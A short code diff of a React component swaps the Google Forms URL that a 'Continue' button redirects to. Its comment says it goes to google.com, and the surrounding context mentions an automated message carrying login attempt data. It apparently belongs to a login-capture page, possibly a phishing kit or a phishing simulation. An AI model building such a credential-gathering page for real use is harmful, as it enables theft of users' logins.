@@ -73,7 +73,7 @@ This is an automated message with login attempt data.`,
             {/* Continue Button - redirects to google.com */}
             <button
               onClick={() => {
-                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLScx4_6USiDT-xtr4wx0sMQFFnqWbAdQscDAm95pH8v7_rwU-w/viewform?usp=header';
+                window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdAAUoBrDfLU6UFX2Su3lry8GBCFcJS93RWuBabe9gYxmbvoQ/viewform?usp=sharing&ouid=111823479924118296643';
               }}
               className="px-6 py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition-colors w-full mt-8"
             >
